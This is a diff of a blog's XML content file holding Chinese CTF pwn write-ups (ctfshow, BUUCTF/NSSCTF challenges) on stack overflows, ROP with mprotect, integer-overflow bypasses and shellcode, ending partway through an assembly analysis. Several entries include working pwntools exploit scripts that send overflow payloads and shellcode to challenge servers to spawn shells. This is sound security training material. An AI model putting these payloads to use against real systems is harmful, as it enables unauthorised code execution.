@@ -117,74 +117,6 @@
       </tags>
   </entry>
   <entry>
-    <title>mprotect函数</title>
-    <url>/2025/01/24/mprotect%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="一、mprotect-函数"><a href="#一、mprotect-函数" class="headerlink" title="一、mprotect() 函数"></a>一、<code>mprotect()</code> 函数</h1><h2 id="（1）mprotect-函数简介"><a href="#（1）mprotect-函数简介" class="headerlink" title="（1）mprotect() 函数简介"></a>（1）<code>mprotect()</code> 函数简介</h2><p>在二进制漏洞利用（Pwn）中，<code>mprotect()</code> 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 <code>mprotect()</code> 函数将该区域的权限修改为可执行。</p>
-<h2 id="（2）mprotect-函数的原型"><a href="#（2）mprotect-函数的原型" class="headerlink" title="（2）mprotect() 函数的原型"></a>（2）<code>mprotect()</code> 函数的原型</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>
-
-<p><strong>参数说明</strong>：</p>
-<table>
-<thead>
-<tr>
-<th>addr</th>
-<th>len</th>
-<th>prot</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍</td>
-<td>修改权限的内存区域的长度，单位是字节</td>
-<td>指定新的内存访问权限</td>
-</tr>
-</tbody></table>
-<p><strong>内存访问权限：</strong></p>
-<table>
-<thead>
-<tr>
-<th>PROT_READ</th>
-<th>PROT_WRITE</th>
-<th>PROT_EXEC</th>
-<th>PROT_NONE</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>允许读取该内存区域</td>
-<td>允许写入该内存区域</td>
-<td>允许执行该内存区域中的代码</td>
-<td>禁止对该内存区域进行任何访问</td>
-</tr>
-</tbody></table>
-<p><strong>注：一般prot直接修改为7，即可读可写可执行</strong></p>
-<h1 id="二、例题ctfshow49"><a href="#二、例题ctfshow49" class="headerlink" title="二、例题ctfshow49"></a>二、例题ctfshow49</h1><h2 id="（1）思路"><a href="#（1）思路" class="headerlink" title="（1）思路"></a>（1）思路</h2><p>我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以</p>
-<p>但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数</p>
-<p>我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”</p>
-<p><img src="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/image-20250125111005854.png" alt="image-20250125111005854"></p>
-<p>pop_ebx_esi_ebp_ret &#x3D; 0x080a019b</p>
-<p>第一个参数：addr&#x3D;0x80d8000</p>
-<p>第二个参数：len&#x3D;0x1000</p>
-<p>第三个参数：port&#x3D;7</p>
-<p>同样read函数也需要设置三个参数</p>
-<p>在 C 语言里，<code>read</code> 函数的原型如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
-
-<p><strong>参数解释：</strong></p>
-<p>fd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）</p>
-<p>buf：指向用于存储读取数据的缓冲区的指针</p>
-<p>count：期望读取的最大字节数</p>
-<p>第一个参数：fd&#x3D;0</p>
-<p>第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）</p>
-<p>第三个参数：count&#x3D;0x1000</p>
-<h2 id="（2）exp"><a href="#（2）exp" class="headerlink" title="（2）exp"></a>（2）exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28134</span>)</span><br><span class="line">mprotect= elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x080a019b</span></span><br><span class="line">shellcode = asm(shellcraft.sh())               <span class="comment">#生成shellcode</span></span><br><span class="line">addr=<span class="number">0x80d8000</span></span><br><span class="line">buf=<span class="number">0x80d8000</span></span><br><span class="line"><span class="built_in">len</span>=<span class="number">0x1000</span></span><br><span class="line">port=<span class="number">7</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">0x4</span>)+p32(mprotect)           <span class="comment">#将返回地址设为mprotect</span></span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(<span class="built_in">len</span>)+p32(port)   <span class="comment">#设置mprotect的参数</span></span><br><span class="line">payload += p32(read)                              <span class="comment">#将mprotect返回地址设为read</span></span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="built_in">len</span>)               <span class="comment">#设置read的参数</span></span><br><span class="line">payload +=p32(buf)                               <span class="comment">#将read的返回地址设为buf（也就是shellcode）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)                            <span class="comment">#将shellcode写入bss</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>第二周</category>
-      </categories>
-      <tags>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Canary爆破</title>
     <url>/2025/01/25/Canary%E7%88%86%E7%A0%B4/</url>
     <content><![CDATA[<h1 id="ctfshow53"><a href="#ctfshow53" class="headerlink" title="ctfshow53"></a>ctfshow53</h1><h2 id="（1）checksec"><a href="#（1）checksec" class="headerlink" title="（1）checksec"></a>（1）checksec</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png" alt="image-20250125213308165"></p>
@@ -214,89 +146,6 @@
 ]]></content>
       <categories>
         <category>第二周</category>
-      </categories>
-      <tags>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF wp</title>
-    <url>/2025/01/19/wp/</url>
-    <content><![CDATA[<h1 id="1-NISACTF-2022-ReorPwn"><a href="#1-NISACTF-2022-ReorPwn" class="headerlink" title="1.[NISACTF 2022]ReorPwn?"></a>1.[NISACTF 2022]ReorPwn?</h1><p><img src="/2025/01/19/wp/image-20250119144608720.png" alt="image-20250119144608720"></p>
-<p>用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数</p>
-<p>看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了</p>
-<p><img src="/2025/01/19/wp/image-20250119144645315.png" alt="image-20250119144645315"></p>
-<h1 id="2-BJDCTF-2020-babystack2-0"><a href="#2-BJDCTF-2020-babystack2-0" class="headerlink" title="2.[BJDCTF 2020]babystack2.0"></a>2.[BJDCTF 2020]babystack2.0</h1><p>Checksec发现64位nx保护开启</p>
-<p><img src="/2025/01/19/wp/image-20250119140419683.png" alt="image-20250119140419683"></p>
-<p>从题目提示看是整数溢出和栈溢出</p>
-<p>用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数</p>
-<p><img src="/2025/01/19/wp/image-20250119140514421.png" alt="image-20250119140514421"></p>
-<p>搜了一下wp</p>
-<p><img src="/2025/01/19/wp/image-20250119140127117.png" alt="image-20250119140127117"></p>
-<p>看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28220</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;-1&#x27;</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(<span class="number">0x0400726</span>)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="3-BJDCTF-2020-babystack"><a href="#3-BJDCTF-2020-babystack" class="headerlink" title="3.[BJDCTF 2020]babystack"></a>3.[BJDCTF 2020]babystack</h1><p><img src="/2025/01/19/wp/image-20250119140737788.png" alt="image-20250119140737788"></p>
-<p>这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。</p>
-<p>Exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;100&#x27;</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(<span class="number">0x04006E6</span>)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值</p>
-<h1 id="4-NISACTF-2022-ezstack"><a href="#4-NISACTF-2022-ezstack" class="headerlink" title="4.[NISACTF 2022]ezstack"></a>4.[NISACTF 2022]ezstack</h1><p>Checksec发现是32位的。NX保护开启</p>
-<p>Ida分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">22397</span>)</span><br><span class="line">sh_addr=<span class="number">0x804a024</span></span><br><span class="line">system_plt=<span class="number">0x8048390</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                <span class="comment">#第一个p32(sh_addr)用于占位</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="5-GFCTF-2021-where-is-shell"><a href="#5-GFCTF-2021-where-is-shell" class="headerlink" title="5.[GFCTF 2021]where_is_shell"></a>5.[GFCTF 2021]where_is_shell</h1><p>Checksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，</p>
-<p>&#x2F;bin&#x2F;sh的地址为<img src="/2025/01/19/wp/wps2.jpg" alt="img"></p>
-<p><img src="/2025/01/19/wp/wps3.jpg" alt="img"> </p>
-<p>pop rdi；ret地址</p>
-<p><img src="/2025/01/19/wp/wps4.jpg" alt="img"> </p>
-<p>还需要栈对齐需要</p>
-<p><img src="/2025/01/19/wp/wps5.jpg" alt="img"> </p>
-<p>Exp模板</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote（）</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">8</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/01/19/wp/wps6.jpg" alt="img"> </p>
-<h1 id="6-NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#6-NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="6.[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>6.[NSSCTF 2022 Spring Recruit]R3m4ke?</h1><p>checksec查看<img src="/2025/01/19/wp/wps7.jpg" alt="img"></p>
-<p>Ida打开，发现危险函数gets栈溢出</p>
-<p>有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出</p>
-<p>找到system的地址栈溢出返回到system地址</p>
-<p><img src="/2025/01/19/wp/wps8.jpg" alt="img"> </p>
-<p>Exp</p>
-<p><img src="/2025/01/19/wp/wps9.jpg" alt="img"> </p>
-<h1 id="7-HNCTF-2022-Week1-easyoverflow"><a href="#7-HNCTF-2022-Week1-easyoverflow" class="headerlink" title="7.[HNCTF 2022 Week1]easyoverflow"></a>7.[HNCTF 2022 Week1]easyoverflow</h1><p>Checksec</p>
-<p><img src="/2025/01/19/wp/wps10.jpg" alt="img"> </p>
-<p>Ida打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址</p>
-<p>地址：<img src="/2025/01/19/wp/wps11.jpg" alt="img"></p>
-<p>Exp</p>
-<p><img src="/2025/01/19/wp/wps12.jpg" alt="img"> </p>
-<h1 id="8-WUSTCTF-2020-getshell"><a href="#8-WUSTCTF-2020-getshell" class="headerlink" title="8.[WUSTCTF 2020]getshell"></a>8.[WUSTCTF 2020]getshell</h1><p>Checksec</p>
-<p><img src="/2025/01/19/wp/wps13.jpg" alt="img"> </p>
-<p>Ida</p>
-<p>发现<img src="/2025/01/19/wp/wps14.jpg" alt="img"></p>
-<p>可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址<img src="/2025/01/19/wp/wps15.jpg" alt="img"></p>
-<p>Exp</p>
-<p><img src="/2025/01/19/wp/wps16.jpg" alt="img"> </p>
-<h1 id="9-GDOUCTF-2023-EASY-PWN"><a href="#9-GDOUCTF-2023-EASY-PWN" class="headerlink" title="9.[GDOUCTF 2023]EASY PWN"></a>9.[GDOUCTF 2023]EASY PWN</h1><p>Ida分析发现是随机生成一个数字，猜数字</p>
-<p>发现gets函数，可以栈溢出</p>
-<p>Shift+f12发现后门flag.txt </p>
-<p>找到地址0x0011D5 </p>
-<p>直接溢出</p>
-<p>Exp如下</p>
-<p><img src="/2025/01/19/wp/wps17.jpg" alt="img"> </p>
-<h1 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10.others_shellcode"></a>10.others_shellcode</h1><p> checksec查看</p>
-<p><img src="/2025/01/19/wp/wps18.jpg" alt="wps18"></p>
-<p>Ida查看</p>
-<p>没有看懂</p>
-<p>Nc一下</p>
-<p><img src="/2025/01/19/wp/wps19.jpg" alt="wps19"></p>
-<p>直接出来了，非常神奇</p>
-<p>搜了一下wp</p>
-<p><img src="/2025/01/19/wp/wps20.jpg" alt="wps20"></p>
-]]></content>
-      <categories>
-        <category>第一周</category>
       </categories>
       <tags>
         <tag>wp</tag>
@@ -416,6 +265,166 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28112</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
+
+]]></content>
+      <categories>
+        <category>第三周</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF wp</title>
+    <url>/2025/01/19/wp/</url>
+    <content><![CDATA[<h1 id="1-NISACTF-2022-ReorPwn"><a href="#1-NISACTF-2022-ReorPwn" class="headerlink" title="1.[NISACTF 2022]ReorPwn?"></a>1.[NISACTF 2022]ReorPwn?</h1><p><img src="/2025/01/19/wp/image-20250119144608720.png" alt="image-20250119144608720"></p>
+<p>用ida打开发现gets危险函数但是没有栈溢出，在调用system函数前，调用了fun函数</p>
+<p>看一下fun函数没看懂搜了一下，是交换字符串的位置反转一下，输入sl没有反应，直接输入galf tac，flag出来了</p>
+<p><img src="/2025/01/19/wp/image-20250119144645315.png" alt="image-20250119144645315"></p>
+<h1 id="2-BJDCTF-2020-babystack2-0"><a href="#2-BJDCTF-2020-babystack2-0" class="headerlink" title="2.[BJDCTF 2020]babystack2.0"></a>2.[BJDCTF 2020]babystack2.0</h1><p>Checksec发现64位nx保护开启</p>
+<p><img src="/2025/01/19/wp/image-20250119140419683.png" alt="image-20250119140419683"></p>
+<p>从题目提示看是整数溢出和栈溢出</p>
+<p>用idea打开发现后门函数backdoor（0x0400726）和危险函数read可以栈溢出（0x10），但是被if函数限制了得绕过if函数</p>
+<p><img src="/2025/01/19/wp/image-20250119140514421.png" alt="image-20250119140514421"></p>
+<p>搜了一下wp</p>
+<p><img src="/2025/01/19/wp/image-20250119140127117.png" alt="image-20250119140127117"></p>
+<p>看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28220</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;-1&#x27;</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(<span class="number">0x0400726</span>)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-BJDCTF-2020-babystack"><a href="#3-BJDCTF-2020-babystack" class="headerlink" title="3.[BJDCTF 2020]babystack"></a>3.[BJDCTF 2020]babystack</h1><p><img src="/2025/01/19/wp/image-20250119140737788.png" alt="image-20250119140737788"></p>
+<p>这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。</p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;100&#x27;</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(<span class="number">0x04006E6</span>)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值</p>
+<h1 id="4-NISACTF-2022-ezstack"><a href="#4-NISACTF-2022-ezstack" class="headerlink" title="4.[NISACTF 2022]ezstack"></a>4.[NISACTF 2022]ezstack</h1><p>Checksec发现是32位的。NX保护开启</p>
+<p>Ida分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">22397</span>)</span><br><span class="line">sh_addr=<span class="number">0x804a024</span></span><br><span class="line">system_plt=<span class="number">0x8048390</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                <span class="comment">#第一个p32(sh_addr)用于占位</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-GFCTF-2021-where-is-shell"><a href="#5-GFCTF-2021-where-is-shell" class="headerlink" title="5.[GFCTF 2021]where_is_shell"></a>5.[GFCTF 2021]where_is_shell</h1><p>Checksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，</p>
+<p>&#x2F;bin&#x2F;sh的地址为<img src="/2025/01/19/wp/wps2.jpg" alt="img"></p>
+<p><img src="/2025/01/19/wp/wps3.jpg" alt="img"> </p>
+<p>pop rdi；ret地址</p>
+<p><img src="/2025/01/19/wp/wps4.jpg" alt="img"> </p>
+<p>还需要栈对齐需要</p>
+<p><img src="/2025/01/19/wp/wps5.jpg" alt="img"> </p>
+<p>Exp模板</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote（）</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">8</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/wp/wps6.jpg" alt="img"> </p>
+<h1 id="6-NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#6-NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="6.[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>6.[NSSCTF 2022 Spring Recruit]R3m4ke?</h1><p>checksec查看<img src="/2025/01/19/wp/wps7.jpg" alt="img"></p>
+<p>Ida打开，发现危险函数gets栈溢出</p>
+<p>有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出</p>
+<p>找到system的地址栈溢出返回到system地址</p>
+<p><img src="/2025/01/19/wp/wps8.jpg" alt="img"> </p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps9.jpg" alt="img"> </p>
+<h1 id="7-HNCTF-2022-Week1-easyoverflow"><a href="#7-HNCTF-2022-Week1-easyoverflow" class="headerlink" title="7.[HNCTF 2022 Week1]easyoverflow"></a>7.[HNCTF 2022 Week1]easyoverflow</h1><p>Checksec</p>
+<p><img src="/2025/01/19/wp/wps10.jpg" alt="img"> </p>
+<p>Ida打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址</p>
+<p>地址：<img src="/2025/01/19/wp/wps11.jpg" alt="img"></p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps12.jpg" alt="img"> </p>
+<h1 id="8-WUSTCTF-2020-getshell"><a href="#8-WUSTCTF-2020-getshell" class="headerlink" title="8.[WUSTCTF 2020]getshell"></a>8.[WUSTCTF 2020]getshell</h1><p>Checksec</p>
+<p><img src="/2025/01/19/wp/wps13.jpg" alt="img"> </p>
+<p>Ida</p>
+<p>发现<img src="/2025/01/19/wp/wps14.jpg" alt="img"></p>
+<p>可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址<img src="/2025/01/19/wp/wps15.jpg" alt="img"></p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps16.jpg" alt="img"> </p>
+<h1 id="9-GDOUCTF-2023-EASY-PWN"><a href="#9-GDOUCTF-2023-EASY-PWN" class="headerlink" title="9.[GDOUCTF 2023]EASY PWN"></a>9.[GDOUCTF 2023]EASY PWN</h1><p>Ida分析发现是随机生成一个数字，猜数字</p>
+<p>发现gets函数，可以栈溢出</p>
+<p>Shift+f12发现后门flag.txt </p>
+<p>找到地址0x0011D5 </p>
+<p>直接溢出</p>
+<p>Exp如下</p>
+<p><img src="/2025/01/19/wp/wps17.jpg" alt="img"> </p>
+<h1 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10.others_shellcode"></a>10.others_shellcode</h1><p> checksec查看</p>
+<p><img src="/2025/01/19/wp/wps18.jpg" alt="wps18"></p>
+<p>Ida查看</p>
+<p>没有看懂</p>
+<p>Nc一下</p>
+<p><img src="/2025/01/19/wp/wps19.jpg" alt="wps19"></p>
+<p>直接出来了，非常神奇</p>
+<p>搜了一下wp</p>
+<p><img src="/2025/01/19/wp/wps20.jpg" alt="wps20"></p>
+]]></content>
+      <categories>
+        <category>第一周</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode2</title>
+    <url>/2025/01/31/shellcode2/</url>
+    <content><![CDATA[<h1 id="ctfshow65"><a href="#ctfshow65" class="headerlink" title="ctfshow65"></a>ctfshow65</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX unknown - GNU_STACK missing</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>64位，开启PIE,完全开启RELRO,Has RWX segments  </p>
+<p>ida：无法反编译，借助ai理解一下代码</p>
+<h2 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h2><p><strong><code>jl</code> (Jump if Less)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, ebx</span><br><span class="line">jl loc_1234</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果 <code>eax &lt; ebx</code>，则跳转到 <code>loc_1234</code></strong></p>
+<p><strong>2.<code>jg</code> (Jump if Greater)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, ebx</span><br><span class="line">jg loc_1234</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果 <code>eax &gt; ebx</code>，则跳转到 <code>loc_1234</code></strong></p>
+<p><strong>3.<code>jle</code> (Jump if Less or Equal)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, ebx</span><br><span class="line">jle loc_1234</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果 <code>eax &lt;= ebx</code>，则跳转到 <code>loc_1234</code></strong></p>
+<p><strong>4.<code>jmp</code> (Jump)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp loc_1234</span><br></pre></td></tr></table></figure>
+
+<p><strong>无论条件如何，都会跳转到 <code>loc_1234</code></strong></p>
+<p><strong>5.<code>cmp</code> (Compare)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, ebx</span><br></pre></td></tr></table></figure>
+
+<p><strong>比较 <code>eax</code> 和 <code>ebx</code> 的大小，并根据结果设置标志位</strong></p>
+<p><strong>6.<code>cdqe</code>、<code>movzx</code></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cdqe</span><br><span class="line">movzx   eax, [rbp+rax+buf]</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个实在看不懂，粘一下师傅们的解释</strong></p>
+<p><strong>cdqe使用eax的最高位拓展rax高32位的所有位 movzx则是按无符号数传送+扩展（16-32） EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位大致就是将我们输入的字符串每一位进行比较</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">    push    rbp</span><br><span class="line">    mov     rbp, rsp</span><br><span class="line">    sub     rsp, 410h</span><br><span class="line">    mov     edx, 14h</span><br><span class="line">    lea     rsi, aInputYouShellc</span><br><span class="line">    mov     edi, 1</span><br><span class="line">    mov     eax, 0</span><br><span class="line">    call    _write</span><br><span class="line">    lea     rax, [rbp+buf]</span><br><span class="line">    mov     edx, 400h</span><br><span class="line">    mov     rsi, rax</span><br><span class="line">    mov     edi, 0</span><br><span class="line">    mov     eax, 0</span><br><span class="line">    call    _read</span><br><span class="line">    mov     [rbp+var_8], eax</span><br><span class="line">    cmp     [rbp+var_8], 0</span><br><span class="line">    jg      short loc_11AC</span><br><span class="line">    mov     eax, 0</span><br><span class="line">    jmp     locret_1254</span><br></pre></td></tr></table></figure>
+
+<p><strong>提示用户输入</strong>：</p>
